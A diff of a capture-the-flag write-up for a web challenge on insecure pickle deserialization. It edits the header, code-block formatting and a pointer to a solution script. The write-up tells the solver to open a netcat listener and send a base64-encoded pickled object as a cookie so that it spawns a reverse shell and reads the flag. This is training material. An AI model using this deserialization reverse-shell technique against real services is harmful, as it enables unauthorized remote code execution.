@@ -1,15 +1,3 @@
-Name
-----
-
-Web: Exotic Attacks: Jar of Pickles
-
-Description
------------
-
-Get the flag from: [url]141.85.224.101:8007/[/url].
-
-Score: 100
-
 Vulnerability
 -------------
 
@@ -21,7 +9,8 @@ Exploit
 Click on the picture, it will take you to 141.85.224.101:8007/jar. Notice the `pickled` cookie.
 Use `nc -nvlk 1234` to open a connection to your machine first.
 Run this program that prints the encoded pickled object of this class that spawns a shell (change the ip to yours).
-```
+
+```python
 import pickle
 import base64
 import os
@@ -39,3 +28,5 @@ if __name__ == '__main__':
 
 Take the output and set it as the Cookie value. Make the request again.
 You should have a shell now, perform a `cat` on the flag file.
+
+Exploit in `../sol/solution.sh`.
